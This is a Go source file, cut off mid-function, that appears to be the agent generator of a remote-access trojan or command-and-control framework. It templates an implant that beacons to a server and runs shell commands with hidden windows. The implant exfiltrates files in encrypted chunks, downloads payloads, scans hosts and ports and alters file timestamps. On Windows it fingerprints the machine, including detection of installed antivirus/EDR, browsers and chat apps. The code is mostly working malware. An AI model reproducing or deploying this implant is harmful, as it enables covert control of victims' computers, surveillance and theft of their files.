package client
import (
	"regexp"
)
func Generate_agent(protocol, os, server, Path, ConnPath, MsgPath,
	switch_key,download,result,_net,
    info,upload,list,option,Username,uid,hostname,
	keyPart,filekey,code,base_rounds,windows_pro string) string {
	//如果参数有一个为空
    if protocol == "" || os == "" || server == "" || Path == "" || ConnPath == "" || MsgPath == "" || switch_key == "" || download == "" || result == "" || _net == "" || info == "" || upload == "" || list == "" || option == "" || Username == "" || uid == "" || hostname == "" || keyPart == "" || filekey == "" || code == "" || base_rounds == "" {
        return "parameter null"
    }
    var os_str, main_str, sys_str, tls_str,package_str,send,inithttp,prototime,protocol_var,header string
	if protocol == "https" {
		tls_str = `"crypto/tls"`
	}else if protocol == "quic"{
        tls_str = `
            "crypto/tls"
            "github.com/quic-go/quic-go"
            "github.com/quic-go/quic-go/http3"
        `
    }else {
		tls_str = ""
	}
	if os == "win" {
		os_str = `a_Mutex.RLock();command := exec.Command(version, "/C", cmd);a_Mutex.RUnlock(); command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}; var stdout, stderr bytes.Buffer; command.Stdout = &stdout; command.Stderr = &stderr; err := command.Run(); if err != nil && stderr.Len() > 0 { return stderr.String() }; return stdout.String()`
		sys_str = `"syscall"`
	} else {
		os_str = `a_Mutex.RLock();cmdObj := exec.Command(version, "-c", cmd);a_Mutex.RUnlock();result, err := cmdObj.CombinedOutput();if err != nil {return ""};return string(result)`
		sys_str = ""
	}
	if os == "android" {
		main_str = ""
        package_str = "run"
	} else {
		main_str = "func main(){run()}"
        package_str = "main"
	}
    if windows_pro == "group_pro" && os == "win" {
        send = `
type AntivirusProcess struct {
	ProcessName string
	DisplayName string
}

var antivirusList = []AntivirusProcess{
    {"360tray.exe", "360 Safe Guard"},
    {"360sd.exe", "360 Antivirus"},
    {"a2guard.exe", "a-squared Antivirus"},
    {"ad-watch.exe", "Lavasoft Antivirus"},
    {"cleaner8.exe", "The Cleaner Antivirus"},
    {"vba32lder.exe", "VB32 Antivirus"},
    {"MongoosaGUI.exe", "Mongoosa Antivirus"},
    {"CorantiControlCenter32.exe", "Coranti2012 Antivirus"},
    {"F-PROT.EXE", "F-PROT Antivirus"},
    {"CMCTrayIcon.exe", "CMC Antivirus"},
    {"K7TSecurity.exe", "K7 Antivirus"},
    {"UnThreat.exe", "UnThreat Antivirus"},
    {"CKSoftShiedAntivirus4.exe", "Shield Antivirus"},
    {"AVWatchService.exe", "VIRUSfighter Antivirus"},
    {"ArcaTasksService.exe", "ArcaVir Antivirus"},
    {"iptray.exe", "Immunet Antivirus"},
    {"PSafeSysTray.exe", "PSafe Antivirus"},
    {"nspupsvc.exe", "nProtect Antivirus"},
    {"SpywareTerminatorShield.exe", "SpywareTerminator Antivirus"},
    {"BKavService.exe", "Bkav Antivirus"},
    {"MsMpEng.exe", "Microsoft Security Essentials"},
    {"SBAMSvc.exe", "VIPRE"},
    {"ccSvcHst.exe", "Norton Antivirus"},
    {"QQ.exe", "QQ"},
    {"f-secure.exe", "F-Secure"},
    {"avp.exe", "Kaspersky"},
    {"KvMonXP.exe", "Jiangmin Antivirus"},
    {"RavMonD.exe", "Rising Antivirus"},
    {"Mcshield.exe", "McAfee"},
    {"egui.exe", "NOD32"},
    {"kxetray.exe", "Kingsoft Antivirus"},
    {"knsdtray.exe", "Keniu Antivirus"},
    {"avcenter.exe", "Avira (Red Umbrella)"},
    {"ashDisp.exe", "Avast Internet Security"},
    {"rtvscan.exe", "Norton Antivirus"},
    {"ksafe.exe", "Kingsoft Guard"},
    {"QQPCRTP.exe", "QQ PC Manager"},
    {"Miner.exe", "Miner"},
    {"AYAgent.aye", "Capsule Korea"},
    {"patray.exe", "AhnLab"},
    {"V3Svc.exe", "AhnLab V3"},
    {"avgwdsvc.exe", "AVG Antivirus"},
    {"ccSetMgr.exe", "Symantec"},
    {"QUHLPSVC.EXE", "QUICK HEAL Antivirus"},
    {"mssecess.exe", "Microsoft Antivirus"},
    {"SavProgress.exe", "Sophos Antivirus"},
    {"fsavgui.exe", "F-Secure Antivirus"},
    {"vsserv.exe", "Bitdefender"},
    {"remupd.exe", "Panda Security"},
    {"FortiTray.exe", "Fortinet"},
    {"safedog.exe", "SafeDog"},
    {"parmor.exe", "Trojan Star"},
    {"beikesan.exe", "Shell Security"},
    {"KSWebShield.exe", "Kingsoft Web Shield"},
    {"TrojanHunter.exe", "Trojan Hunter"},
    {"GG.exe", "Juden Game Shield"},
    {"adam.exe", "Green Eagle Security"},
    {"AST.exe", "Super Patrol"},
    {"ananwidget.exe", "Mozhe Security Expert"},
    {"AVK.exe", "GData"},
    {"ccapp.exe", "Symantec Norton"},
    {"avg.exe", "AVG Anti-Virus"},
    {"spidernt.exe", "Dr.Web"},
    {"Mcshield.exe", "McAfee"},
    {"avgaurd.exe", "Avira Antivir"},
    {"F-PROT.exe", "F-Prot AntiVirus"},
    {"vsmon.exe", "ZoneAlarm"},
    {"avp.exee", "Kaspersky"},
    {"cpf.exe", "Comodo"},
    {"outpost.exe", "Outpost Firewall"},
    {"rfwmain.exe", "Rising Firewall"},
    {"kpfwtray.exe", "Kingsoft Web Guard"},
    {"FYFireWall.exe", "Fengyun Firewall"},
    {"MPMon.exe", "MicroPoint Active Defense"},
    {"pfw.exe", "SkyNet Firewall"},
    {"S.exe", "Chicken Catcher"},
    {"1433.exe", "Scanning 1433"},
    {"DUB.exe", "Brute Force"},
    {"ServUDaemon.exe", "Found S-U"},
    {"BaiduSdSvc.exe", "Baidu Antivirus"},
    {"bdservicehost.exe", "Bitdefender"},
    {"bdagent.exe", "Bitdefender Agent"},
    {"avengine.exe", "TotalAV"},
    {"avgui.exe", "AVG UI"},
    {"avastui.exe", "Avast UI"},
    {"savservice.exe", "Sophos Endpoint"},
    {"tmccsf.exe", "Trend Micro Core Service"},
    {"NisSrv.exe", "Microsoft Defender SmartScreen"},
    {"mfemms.exe", "McAfee Endpoint Security"},
    {"mfetp.exe", "McAfee Exploit Prevention"},
    {"mfevtps.exe", "McAfee Validation Trust Protection"},
    {"swi_service.exe", "Webroot SecureAnywhere"},
    {"f-secure.exe", "F-Secure Anti-Virus"},
    {"vsservppl.exe", "Bitdefender Protected Process"},
    {"zamsvc.exe", "Zemana AntiMalware"},
    {"mbam.exe", "Malwarebytes"},
    {"mbamservice.exe", "Malwarebytes Service"},
    {"msmpeng.exe", "Windows Defender"},
    {"MpDefenderCoreService", "Windows Defender"},
    {"windefend.exe", "Windows Defender Service"},
    {"drweb32wrt.exe", "Dr.Web Scanner"},
    {"dwengine.exe", "Doctor Web Engine"},
    {"clamd.exe", "ClamAV Daemon"},
    {"clamtray.exe", "ClamWin Antivirus"},
    {"immunetprotect.exe", "Immunet Protect"},
    {"emsisoft.exe", "Emsisoft Anti-Malware"},
    {"esets.exe", "ESET Service"},
    {"ekrn.exe", "ESET NOD32 Kernel"},
    {"egui.exe", "ESET GUI"},
    {"cyserver.exe", "Cylance Smart Antivirus"},
    {"cytray.exe", "Cylance UI"},
    {"SentinelAgent.exe", "SentinelOne Agent"},
    {"csfalconservice.exe", "CrowdStrike Falcon Sensor"},
    {"SophosFS.exe", "Sophos File Scanner"},
    {"SophosHealth.exe", "Sophos Health Service"},
    {"SophosUI.exe", "Sophos UI"},
    {"SEP.exe", "Symantec Endpoint Protection"},
    {"sngui.exe", "Sophos Network GUI"},
    {"xagt.exe", "FireEye Agent"},
    {"tmproxy.exe", "TrendMicro Proxy Service"},
    {"avkcl.exe", "GData AVK"},
    {"trjscan.exe", "Trojan Remover"},
    {"webproxy.exe", "Web Security Agent"},
    {"mcshield.exe", "McAfee Scanner"},
    {"pccntmon.exe", "Trend Micro Monitor"},
}
type BrowserProcess struct {
    ProcessName string // Executable process name
    DisplayName string // Browser display name
}

var browserList = []BrowserProcess{
    {"chrome.exe", "Google Chrome"},
    {"msedge.exe", "Microsoft Edge"},
    {"firefox.exe", "Mozilla Firefox"},
    {"opera.exe", "Opera"},
    {"brave.exe", "Brave Browser"},
    {"vivaldi.exe", "Vivaldi"},
    {"iexplore.exe", "Internet Explorer"},
    {"safari.exe", "Apple Safari"},
    {"chromium.exe", "Chromium Browser"},
    {"maxthon.exe", "Maxthon Browser"},
    {"qqbrowser.exe", "QQ Browser"},
    {"ucbrowser.exe", "UC Browser"},
    {"2345Explorer.exe", "2345 Explorer"},
    {"liebao.exe", "Cheetah Browser"},
    {"sebrowser.exe", "Sogou High-Speed Browser"},
    {"baidubrowser.exe", "Baidu Browser"},
    {"360se.exe", "360 Safe Browser"},
    {"360chrome.exe", "360 Extreme Browser"},
    {"yandex.exe", "Yandex Browser"},
    {"tor.exe", "Tor Browser"},
    {"avastbrowser.exe", "Avast Secure Browser"},
    {"coc_coc_browser.exe", "Cốc Cốc Browser"},
    {"k-meleon.exe", "K-Meleon"},
    {"midori.exe", "Midori"},
    {"waterfox.exe", "Waterfox"},
    {"palemoon.exe", "Pale Moon"},
    {"slimbrowser.exe", "SlimBrowser"},
    {"comodo_dragon.exe", "Comodo Dragon"},
    {"torch.exe", "Torch Browser"},
}
type ChatApp struct {
    ProcessName string // Executable process name
    DisplayName string // Display name
}
var ChatAppList = []ChatApp{
    // 🟦 Domestic chat software
    {"QQ.exe", "QQ"},
    {"Weixin.exe", "WeChat"},
    {"TIM.exe", "TIM"},
    {"AliIM.exe", "AliWangwang"},
    {"DingTalk.exe", "DingTalk"},
    {"Feishu.exe", "Feishu"},
    {"RTX.exe", "RTX Tencent Talk"},

    // 🟦 Foreign chat software
    {"Telegram.exe", "Telegram"},
    {"WhatsApp.exe", "WhatsApp"},
    {"Signal.exe", "Signal"},
    {"Skype.exe", "Skype"},
    {"Zoom.exe", "Zoom"},
    {"Slack.exe", "Slack"},
    {"Discord.exe", "Discord"},
    {"MicrosoftTeams.exe", "Microsoft Teams"},
    {"Viber.exe", "Viber"},
    {"Line.exe", "LINE"},
    {"ICQ.exe", "ICQ"},
    {"Trillian.exe", "Trillian"},
}
func getMACAddresses() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "00:00:00:00:00:00"
	}
	var macs []string
	for _, iface := range interfaces {
		mac := iface.HardwareAddr.String()
		if mac != "" {
			macs = append(macs, mac)
		}
	}
	return strings.Join(macs, ",")
}
func getCPUFromRegistry() string {
    k,err := registry.OpenKey(registry.LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", registry.QUERY_VALUE)
    if err != nil {
        return ""
    }
    defer k.Close()

    cpuName, _, err := k.GetStringValue("ProcessorNameString")
    if err != nil {
        return ""
    }
    return cpuName
}
func matchAntivirus(lowerSet map[string]bool) string {
	var ant []string
	for _, av := range antivirusList {
		if lowerSet[strings.ToLower(av.ProcessName)] {
			ant = append(ant, av.DisplayName)
		}
	}
	return strings.Join(ant, ",")
}
func matchBrowsers(lowerSet map[string]bool) string {
	var bro []string
	for _, browser := range browserList {
		if lowerSet[strings.ToLower(browser.ProcessName)] {
			bro = append(bro, browser.DisplayName)
		}
	}
	return strings.Join(bro, ",")
}
func matchChatApps(lowerSet map[string]bool) string {
	var apps []string
	for _, chat := range ChatAppList {
		if lowerSet[strings.ToLower(chat.ProcessName)] {
			apps = append(apps, chat.DisplayName)
		}
	}
	return strings.Join(apps, ",")
}
func getWindowsVersion() string {
	key_, err := registry.OpenKey(registry.LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
	if err != nil {
		return "unknown"
	}
	defer key_.Close()
	productName, _, err := key_.GetStringValue("ProductName")
	if err != nil {
		return "unknown"
	}
	return productName
}
func getProcess_list() []string {
	processes,_:= process.Processes()
	var names []string
	for _, p := range processes {
		name, err := p.Name()
		if err == nil && name != "" {
			names = append(names, name)
		}
	}
	return names
}
func GetArch() string {
	return runtime.GOARCH
}
func send() { //发送头部信息
    Process_win := getProcess_list()
    lowerSet := make(map[string]bool)
    for _, p := range Process_win {
        lowerSet[strings.ToLower(p)] = true
    }
    macs := getMACAddresses() //获取地址
    cpuInfo := getCPUFromRegistry()
    Antivirus := matchAntivirus(lowerSet)
    Browsers := matchBrowsers(lowerSet)
    ChatApps := matchChatApps(lowerSet)
    vmStat, _ := mem.VirtualMemory()
    systemType := getWindowsVersion()
    Arm := GetArch()
    usedGB := strconv.FormatFloat(float64(vmStat.Used)/(1024*1024*1024), 'f', 1, 64)
    totalGB := strconv.FormatFloat(float64(vmStat.Total)/(1024*1024*1024), 'f', 1, 64)
    percent := strconv.FormatFloat(vmStat.UsedPercent, 'f', 0, 64)
    memoryStr := usedGB + "/" + totalGB + " GB (" + percent + "%)"

    re_url := protocol + master + "//*Path*/?/*option*/=/*info*/"
    currentDir, _:= os.Getwd()
    currentDir = strings.ReplaceAll(currentDir, "\\", "/")
    parts := strings.Split(master, ":")
	executable, _ := os.Executable()
    a_Mutex.RLock();delay_ := delay;version_:=version;clientname_:= clientname;jitter_:=jitter;a_Mutex.RUnlock()
    dataList := []string{clientname_,user,osname,strconv.Itoa(int(delay_)),getInternalIPs(),currentDir,version_,parts[len(parts)-1],protocol,strconv.Itoa(int(jitter_)),executable,macs,cpuInfo,Antivirus,Browsers,ChatApps,memoryStr,systemType,Arm,}
    encodedData, err := json.Marshal(dataList)
    if err != nil {
        return
    }
    add_str := string(encodedData)
    encry_str := get_encry_s(&add_str)
    data:= map[string]string{"/*uid*/":uid,"/*result*/":encry_str}
    post(data, re_url)
}
    `
    }else{
        send = `
        func send() {
            re_url := protocol + master + "//*Path*/?/*option*/=/*info*/"
            currentDir, _:= os.Getwd()
            currentDir = strings.ReplaceAll(currentDir, "\\", "/")
            parts := strings.Split(master, ":")
			executable, _ := os.Executable()
            a_Mutex.RLock();delay_ := delay;version_:=version;clientname_:= clientname;jitter_:=jitter;a_Mutex.RUnlock()
            dataList := []string{clientname_,user,osname,strconv.Itoa(int(delay_)),getInternalIPs(),currentDir,version_,parts[len(parts)-1],protocol,strconv.Itoa(int(jitter_)),executable,}
            encodedData, err := json.Marshal(dataList)
            if err != nil {return}
            add_str := string(encodedData)
            encry_str := get_encry_s(&add_str)
            data:= map[string]string{"/*uid*/":uid,"/*result*/":encry_str}
            post(data, re_url)
        }
        `
    }
    if protocol == "quic"{
        inithttp = `
           var transport = &http3.Transport{
                TLSClientConfig: &tls.Config{
                    InsecureSkipVerify: true,
                    MinVersion:tls.VersionTLS13,
                },
                QUICConfig: &quic.Config{
                    MaxIdleTimeout: 0,
					KeepAlivePeriod: 0,
                },
            }
           var client = &http.Client{
                Transport: transport,
                Timeout:   30 * time.Second,
            }
        `
    }else if protocol == "http"{
        inithttp = `
           var transport = &http.Transport{
                MaxConnsPerHost:     1,
                MaxIdleConns:        1,
                MaxIdleConnsPerHost: 1,
                DisableKeepAlives:   false,
                DialContext: (&net.Dialer{
                    Timeout:   30 * time.Second,
                    KeepAlive: 30 * time.Second,
                }).DialContext,
            }
           var client = &http.Client{
                Transport: transport,
                Timeout:   30 * time.Second,
            }
        `
    }else if protocol == "https"{
        inithttp = `
	       var transport = &http.Transport{
	            MaxConnsPerHost:     1,
	            MaxIdleConns:        1,
	            MaxIdleConnsPerHost: 1,
	            DisableKeepAlives:   false,
	            ForceAttemptHTTP2:   true,
	            DialContext: (&net.Dialer{
	                Timeout:   30 * time.Second,
	                KeepAlive: 30 * time.Second,
	            }).DialContext,
	            TLSClientConfig: &tls.Config{
	                InsecureSkipVerify: true,
	            },
	        }
	       var client = &http.Client{
	            Transport: transport,
	            Timeout:   30 * time.Second,
	        }
        `
    }
    if protocol == "quic" {
        prototime = `
            mt := time.Duration(0)
            if d >= 30 {
                mt = 5 * time.Second
            }
            nt := &http3.Transport{
                TLSClientConfig: &tls.Config{
                    InsecureSkipVerify: true,
                    MinVersion:         tls.VersionTLS13,
                },
                QUICConfig: &quic.Config{MaxIdleTimeout: mt, KeepAlivePeriod: 0},
            }
            nc := &http.Client{Transport: nt, Timeout: 30 * time.Second}
            clientMutex.Lock()
            old := transport
            transport, client = nt, nc
            clientMutex.Unlock()
            if old != nil {
                old.Close()
            }`
    } else if protocol == "https" {
        prototime = `
            to := time.Duration(0)
            if d >= 30 {
                to = 5 * time.Second
            }
            nt := &http.Transport{
                MaxConnsPerHost:     1,
                MaxIdleConns:        1,
                MaxIdleConnsPerHost: 1,
                DisableKeepAlives:   false,
                ForceAttemptHTTP2:   true,
                DialContext: (&net.Dialer{
                    Timeout:   30 * time.Second,
                    KeepAlive: 30 * time.Second,
                }).DialContext,
                TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                IdleConnTimeout: to,
            }
            nc := &http.Client{Transport: nt, Timeout: 30 * time.Second}
            clientMutex.Lock()
            old := transport
            transport, client = nt, nc
            clientMutex.Unlock()
            if old != nil {
                old.CloseIdleConnections()
            }`
    } else if protocol == "http" {
        prototime = `
            to := time.Duration(0)
            if d >= 30 {
                to = 5 * time.Second
            }
            nt := &http.Transport{
                MaxConnsPerHost:     1,
                MaxIdleConns:        1,
                MaxIdleConnsPerHost: 1,
                DisableKeepAlives:   false,
                DialContext: (&net.Dialer{
                    Timeout:   30 * time.Second,
                    KeepAlive: 30 * time.Second,
                }).DialContext,
                IdleConnTimeout: to,
            }
            nc := &http.Client{Transport: nt, Timeout: 30 * time.Second}
            clientMutex.Lock()
            old := transport
            transport, client = nt, nc
            clientMutex.Unlock()
            if old != nil {
                old.CloseIdleConnections()
            }`
    }
    if protocol == "quic" {
        protocol_var = "\"https://\""
        header = `
        get_headers map[string]string = map[string]string{"Accept": "text/html,application/xhtml+xml","Accept-Encoding": "gzip, deflate","Accept-Language": "zh-CN,zh;q=0.9","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",}
        post_headers map[string]string = map[string]string{"Content-Type": "application/x-www-form-urlencoded","Accept-Encoding": "gzip, deflate","Accept-Language": "zh-CN,zh;q=0.9","Cache-Control": "max-age=0","Upgrade-Insecure-Requests": "1","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",}
        `
    }else{
        protocol_var = "\""+protocol + "://\""
        header = `
        get_headers map[string]string= map[string]string{"Accept":"q=0.7;text/html,application/xhtml+xml","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6","Upgrade-Insecure-Requests": "1","User-Agent":"Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0","Connection":"keep-alive",}
        post_headers map[string]string= map[string]string{"Content-Type":"application/x-www-form-urlencoded","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6","Cache-Control":"max-age=0","Upgrade-Insecure-Requests": "1","User-Agent":"Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0","Connection":"keep-alive",}
        `
    }
    s_server := "\""+server+"\""
    u_username := "\""+Username+"\""
    o_os := "\""+os+"\""
    templateStr := `
    package /*package_str*/
    import (
        "bytes"
        "crypto/mlkem"
        crand "crypto/rand"
        "math/big"
		"math"
        "io"
        "io/ioutil"
        "net/http"
        "net"
        "os"
        "os/exec"
        "strings"
        "time"
        "mime/multipart"
        "strconv"
        "sync"
        "path/filepath"
        "encoding/binary"
        "encoding/json"
        /*sys_str*/
        /*tls_str*/
    )
    var(
        osname = /*os*/
        protocol = /*protocol_var*/
        uid string
        version string
        clientname string
        delay int = 30
        waitTime int = 3
        jitter int = 5
        a_Mutex sync.RWMutex
        base_rounds string = "/*base_rounds*/"
        decodeMap  = make(map[byte]int)
        onece bool = true
        user string = /*Username*/
        master string = /*server*/
        key []byte
        keyMutex sync.RWMutex
        clientMutex sync.RWMutex
        /*header*/
    )
    /*inithttp*/
    /*main_str*/
    func getUrl(url string) string {
        for {
            req, err := http.NewRequest("GET", url, nil)
            if err != nil {
                time.Sleep(time.Duration(waitTime) * time.Second)
                continue
            }
            for key_, value := range get_headers {
                req.Header.Set(key_, value)
            }
            clientMutex.RLock()
            resp, err := client.Do(req)
            clientMutex.RUnlock()
            if err != nil {
                time.Sleep(time.Duration(waitTime) * time.Second)
                continue
            }
            respBody, err := ioutil.ReadAll(resp.Body)
            resp.Body.Close()
            if err != nil {
                time.Sleep(time.Duration(waitTime) * time.Second)
                continue
            }
            if len(respBody) == 0 {
                return ""
            }
            return strings.TrimSpace(string(respBody))
        }
    }
    func post(data map[string]string, re_url string) {
        for {
            var formStr strings.Builder
            for key_, value := range data {
                formStr.WriteString(urlEncode(key_))
                formStr.WriteString("=")
                formStr.WriteString(urlEncode(value))
                formStr.WriteString("&")
            }
            formData := formStr.String()
            if len(formData) > 0 {
                formData = formData[:len(formData)-1]
            }
            req, err := http.NewRequest("POST", re_url, strings.NewReader(formData))
            if err != nil {
                time.Sleep(time.Duration(waitTime) * time.Second)
                continue
            }
            for key_, value := range post_headers {
                req.Header.Set(key_, value)
            }
            clientMutex.RLock()
            resp, err := client.Do(req)
            clientMutex.RUnlock()
            if err != nil {
                time.Sleep(time.Duration(waitTime) * time.Second)
                continue
            }
            resp.Body.Close()
            return
        }
    }
    func urlEncode(s string) string {
        hexChars := "0123456789ABCDEF"
        var buf strings.Builder
        for i := 0; i < len(s); i++ {
            c := s[i]
            if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~' {
                buf.WriteByte(c)
            } else {
                buf.WriteByte('%')
                buf.WriteByte(hexChars[c>>4])
                buf.WriteByte(hexChars[c&0x0F])
            }
        }
        return buf.String()
    }
    func downloadFile(fileKey string) {
        var fileInfo struct {
            UID       string
            Filename  string
            Split_size int
        }
        if err := json.Unmarshal([]byte(fileKey), &fileInfo); err != nil {
            return
        }
        if fileInfo.Filename == "" || fileInfo.Split_size <= 0 {
            return
        }
        encryData := get_encry_s(&fileKey)
        url := protocol + master +"//*Path*/?/*option*/=/*download*/&/*uid*/=" +uid +"&/*filekey*/=" +encryData
        filename := fileInfo.Filename
        retryCount := 0
        for {
            var maxRetry int
            a_Mutex.RLock()
            if delay < 30 {
                maxRetry = 30
            } else {
                maxRetry = delay
            }
            a_Mutex.RUnlock()
            clientMutex.RLock()
            response, err := client.Get(url)
            clientMutex.RUnlock()
            if err != nil {
                retryCount++
                if retryCount < maxRetry {
                    time.Sleep(2 * time.Second)
                    continue
                }
                return
            }
            if response.StatusCode != http.StatusOK {
                response.Body.Close()
                return
            }
            fileData, err := io.ReadAll(response.Body)
            response.Body.Close()
            if err != nil {
                return
            }
            if len(fileData) == 0 {
                return
            }
            if err := get_decry_f(filename, fileData); err != nil {
                return
            }
            sleepdelay()
        }
    }
    func GET_U_FILE(cmd, splitSize string) {
        splitSizeInt64, err := strconv.ParseInt(splitSize, 10, 64)
        if err != nil || splitSizeInt64 <= 0 {return}
        intSize := int(splitSizeInt64)
        if intSize <= 0 || int64(intSize) != splitSizeInt64 {return}
        info, err := os.Stat(cmd)
        if err != nil {return}
        fileSize := info.Size()
        if fileSize == 0 {return}
        f, err := os.Open(cmd)
        if err != nil {return}
        defer f.Close()
        var maxRetry int
        a_Mutex.RLock();if delay < 30 {maxRetry = 30} else {maxRetry = delay};a_Mutex.RUnlock()
        start := int64(0)
        buf := make([]byte, intSize)
        for start < fileSize {
            end := start + splitSizeInt64
            if splitSizeInt64 > fileSize-start {
                end = fileSize
            }
            chunkSize := int(end - start)
            n, err := io.ReadFull(f, buf[:chunkSize])
            if err != nil && err != io.ErrUnexpectedEOF {return}
            rawChunk := buf[:n]
            encryptedChunk := Encrypt(rawChunk)
            if encryptedChunk == nil {return}
            retryCount := 0
            for retryCount < maxRetry {
                a_Mutex.RLock();clientname_ := clientname;a_Mutex.RUnlock()
                dataList := []string{clientname_,splitSize,strconv.FormatInt(fileSize, 10),strconv.FormatInt(start, 10),strconv.FormatInt(end, 10),}
                encodedData, err := json.Marshal(dataList)
                if err != nil {
                    return
                }
                str_encry := string(encodedData)
                data_encry := get_encry_s(&str_encry)
                var buffer bytes.Buffer
                writer := multipart.NewWriter(&buffer)
                part, _ := writer.CreateFormFile("/*upload*/", get_encry_s(&cmd))
                io.Copy(part, bytes.NewReader(encryptedChunk))
                writer.WriteField("/*uid*/", uid)
                writer.WriteField("/*result*/", data_encry)
                writer.Close()
                url := protocol + master + "//*Path*/?/*option*/=/*upload*/"
                req, _ := http.NewRequest("POST", url, &buffer)
                req.Header.Set("Content-Type", writer.FormDataContentType())
                clientMutex.RLock()
                resp, err := client.Do(req)
                clientMutex.RUnlock()
                if err == nil && resp.StatusCode == http.StatusOK {
                    resp.Body.Close()
                    break
                }
                if resp != nil {
                    resp.Body.Close()
                }
                retryCount++
                time.Sleep(2 * time.Second)
            }
            if retryCount >= maxRetry {return}
            start = end
            sleepdelay()
        }
    }
    func getCmd() {
        url := protocol + master + "//*Path*/?/*option*/=/*MsgPath*/&/*uid*/=" + uid
        reURL := protocol + master + "//*Path*/?/*option*/=/*result*/"
        fileURL := protocol + master + "//*Path*/?/*option*/=/*list*/"
        type CommandMessage struct {
            Command string
            Args    []string
            Task_id string
        }
        getArg := func(args []string, index int) (string, bool) {
            if index < 0 || index >= len(args) {
                return "", false
            }
            return args[index], true
        }
        for {
            sleepdelay()
            respBody := getUrl(url)
            if respBody == "" {
                continue
            }
            if respBody == uid {
                a_Mutex.Lock();onece = true;a_Mutex.Unlock()
                run()
                return
            }
            decrypted := get_decry_s(&respBody)
            if strings.TrimSpace(decrypted) == "" {
                continue
            }
            var message CommandMessage
            if err := json.Unmarshal([]byte(decrypted), &message); err != nil {
                continue
            }
            message.Command = strings.TrimSpace(message.Command)
            if message.Command == "" {
                continue
            }
            args := message.Args
            switch message.Command {
            case "GET_U_FRIENDS":
                target, ok1 := getArg(args, 0)
                portRange, ok2 := getArg(args, 1)
                delayValue, ok3 := getArg(args, 2)
                if !ok1 || !ok2 || !ok3 {
                    continue
                }
                go scan_u_firends(target,portRange,delayValue,"ping",)
            case "GET_PORTS":
                target, ok1 := getArg(args, 0)
                portRange, ok2 := getArg(args, 1)
                delayValue, ok3 := getArg(args, 2)
                if !ok1 || !ok2 || !ok3 {
                    continue
                }
                go scan_u_firends(target,portRange,delayValue,"port",)
            case "GET_DELAY":
                delayValue, ok := getArg(args, 0)
                if !ok {
                    continue
                }
                GET_DELAY(delayValue)
            case "GET_JITTER":
                jitterValue, ok := getArg(args, 0)
                if !ok {
                    continue
                }
                GET_JITTER(jitterValue)
            case "GET_U_FILE":
                filePath, ok1 := getArg(args, 0)
                splitSize, ok2 := getArg(args, 1)
                if !ok1 || !ok2 {
                    continue
                }
                go GET_U_FILE(filePath, splitSize)
            case "LOAD_U_FILE":
                if len(args) != 3 {
                    continue
                }
                splitSize, err := strconv.Atoi(args[2])
                if err != nil || splitSize <= 0 {
                    continue
                }
                uidJSON, err := json.Marshal(args[0])
                if err != nil {
                    continue
                }
                filenameJSON, err := json.Marshal(args[1])
                if err != nil {
                    continue
                }
                fileKey := "{\"uid\":" + string(uidJSON) +",\"filename\":" +string(filenameJSON) +",\"split_size\":" +strconv.Itoa(splitSize) +"}"
                go downloadFile(fileKey)
            case "LOOK_UP_FILE":
                dirPath, ok := getArg(args, 0)
                if !ok || dirPath == "" {
                    continue
                }
                go listDir(dirPath,fileURL,message.Task_id,)
            case "SWITCH_VERSION":
                newVersion, ok := getArg(args, 0)
                if !ok || newVersion == "" {
                    continue
                }
                a_Mutex.Lock();version = newVersion;a_Mutex.Unlock()
            case "CHANG_FILE_NAME":
                oldPath, ok1 := getArg(args, 0)
                newName, ok2 := getArg(args, 1)
                if !ok1 || !ok2 {
                    continue
                }
                go CHANG_FILE_NAME(oldPath,newName,)
            case "CHANG_FILE_TIME":
                filePath, ok1 := getArg(args, 0)
                newTime, ok2 := getArg(args, 1)
                if !ok1 || !ok2 {
                    continue
                }
                go CHANG_FILE_TIME(filePath,newTime,)
            case "shell":
                shellCommand, ok := getArg(args, 0)
                if !ok {
                    continue
                }
                go get_Command(shellCommand,reURL,message.Task_id,)
            /*code*/
            default:
                continue
            }
        }
    }
    func get_Command(cmd,re_url,taskid string) {
        result := Command(cmd)
        if result != "" {
            encry_result := get_encry_s(&result)
			encry_task := get_encry_s(&taskid)
            if encry_result == "" {
                return
            }
            data:= map[string]string{
                "/*uid*/": uid,
                "/*result*/": encry_result,
                "/*info*/": encry_task,
            }
            post(data, re_url)
        }
        return
    }
    func Command(cmd string) string {
        /*os_str*/
    }
    func CHANG_FILE_TIME(cmd, newTime string){
	    info, err := os.Stat(cmd)
	    if err != nil {
	        return
	    }
	    if info.IsDir() {
	        return
	    }
	    cleanTime := strings.ReplaceAll(strings.TrimSpace(newTime), "\r", "")
	    modTime, err := time.Parse("2006-01-02 15:04:05", cleanTime)
	    if err != nil {
	        return
	    }
	    if err := os.Chtimes(cmd, modTime, modTime); err != nil {
	        return
	    }
	    return
	}
	
	// 修改文件名
	func CHANG_FILE_NAME(cmd, newName string) {
	    if _, err := os.Stat(cmd); os.IsNotExist(err) {
	        return
	    }
	    dir := filepath.Dir(cmd)
	    newPath := filepath.Join(dir, newName)
	    if err := os.Rename(cmd, newPath); err != nil {
	        return
	    }
	    return
	}
    func formatFileSize(size int64) string {
        const (
            kb = 1024
            mb = 1024 * kb
            gb = 1024 * mb
        )
        switch {
        case size >= gb:
            return strconv.FormatFloat(float64(size)/float64(gb), 'f', 2, 64) + " GB"
        case size >= mb:
            return strconv.FormatFloat(float64(size)/float64(mb), 'f', 2, 64) + " MB"
        case size >= kb:
